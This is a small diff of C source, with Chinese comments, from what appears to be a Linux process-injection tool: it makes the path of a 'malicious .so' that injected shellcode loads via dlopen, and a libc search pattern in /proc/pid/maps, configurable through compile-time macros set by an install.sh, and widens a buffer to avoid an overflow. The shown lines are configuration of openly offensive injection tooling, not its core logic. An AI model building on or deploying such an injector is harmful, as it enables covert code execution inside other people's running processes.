@@ -31,14 +31,22 @@
 #include <sys/user.h>
 #include <sys/wait.h>
 
-/* 恶意 so 落盘路径, 注入时写入目标进程供 shellcode dlopen */
-char evil_so_path[] = "/tmp/hello.so";
+/* 恶意 so 落盘路径, 注入时写入目标进程供 shellcode dlopen.
+ * install.sh 通过编译期宏注入: -DEVIL_SO_PATH_DEFAULT=... */
+#ifndef EVIL_SO_PATH_DEFAULT
+#define EVIL_SO_PATH_DEFAULT "/tmp/hello.so"
+#endif
+char evil_so_path[] = EVIL_SO_PATH_DEFAULT;
 
 /*
- * 在 /proc/pid/maps 中匹配 libc 的特征串.
+ * 在 /proc/pid/maps 中匹配 libc 的特征串, 编译期可用
+ * -DLIBC_PATTERN_DEFAULT=... 覆盖(install.sh -l 参数).
  * 预留较大空间: 找不到 "libc-" 时会 strcpy 成 "libc.so" (原长度不够会越界).
  */
-char libc_pattern[64] = "libc-";
+#ifndef LIBC_PATTERN_DEFAULT
+#define LIBC_PATTERN_DEFAULT "libc-"
+#endif
+char libc_pattern[128] = LIBC_PATTERN_DEFAULT;
 
 /*
  * 待回收子进程的链式栈.
